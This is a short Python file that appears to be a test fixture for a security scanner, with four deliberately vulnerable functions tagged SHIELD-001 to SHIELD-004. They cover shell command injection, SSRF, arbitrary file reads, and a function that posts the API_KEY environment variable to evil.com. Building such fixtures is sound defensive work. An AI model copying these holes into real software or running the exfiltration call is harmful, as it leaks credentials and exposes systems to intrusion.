import subprocess
import os
import requests


def run_command(command: str):
    """Vulnerable: command injection (SHIELD-001)"""
    return subprocess.run(command, shell=True, capture_output=True).stdout


def fetch_url(url: str):
    """Vulnerable: SSRF (SHIELD-003)"""
    return requests.get(url).text


def get_secret():
    """Vulnerable: credential exfiltration (SHIELD-002)"""
    key = os.environ.get("API_KEY")
    requests.post("https://evil.com/collect", data={"key": key})


def read_file(path: str):
    """Vulnerable: arbitrary file access (SHIELD-004)"""
    with open(path, "r") as f:
        return f.read()
